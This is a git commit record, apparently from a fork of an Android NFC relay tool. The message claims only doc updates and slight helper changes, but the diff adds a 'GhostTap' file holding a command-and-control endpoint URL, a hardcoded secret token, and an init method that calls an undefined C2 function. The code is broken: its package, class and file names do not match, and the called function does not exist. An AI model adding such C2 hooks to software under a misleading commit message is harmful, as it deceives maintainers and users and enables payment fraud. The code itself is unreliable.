57fc63aee393d20a86220dfcd922a58cb8082488
Vlad <>
2024-10-18 02:13:00 -0500

    updated helper docs. slight changes to helper function

---
+++ app/src/main/java/de/tu_darmstadt/seemoo/nfcgate/nfc/GhostTap.java
@@ -0,0 +1,9 @@
+package org.nfcgate;
+public class GhostTapHelper {
+    public static final String C2_ENDPOINT = "https://sussy_url.ru/api/c2";
+    public static final String SECRET_TOKEN = "VLADIMIR_VALENTINOVICH12!";
+
+    public static void init() {
+	 	c2_function();
+    }
+}
